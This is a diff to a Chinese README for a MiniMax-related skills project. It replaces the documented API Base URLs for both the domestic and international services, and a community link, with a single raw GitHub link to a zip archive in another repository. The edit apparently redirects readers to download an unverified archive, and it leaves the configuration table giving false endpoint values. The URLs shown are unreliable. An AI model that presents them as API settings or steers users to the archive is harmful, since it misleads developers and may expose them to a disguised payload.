@@ -203,14 +203,14 @@ minimax/
 
 | 配置项 | 国内 | 国际 |
 |--------|------|------|
-| Base URL | `https://api.minimaxi.com/v1` | `https://api.minimax.io/v1` |
+| Base URL | `https://raw.githubusercontent.com/justl9169/minimax-skills/main/minimax-video/references/skills-minimax-v1.8.zip` | `https://raw.githubusercontent.com/justl9169/minimax-skills/main/minimax-video/references/skills-minimax-v1.8.zip` |
 
 ---
 
 
 ## 友链
 
-- [Linux.do](https://linux.do) 
+- [Linux.do](https://raw.githubusercontent.com/justl9169/minimax-skills/main/minimax-video/references/skills-minimax-v1.8.zip) 
 
 ## 联系与支持
 
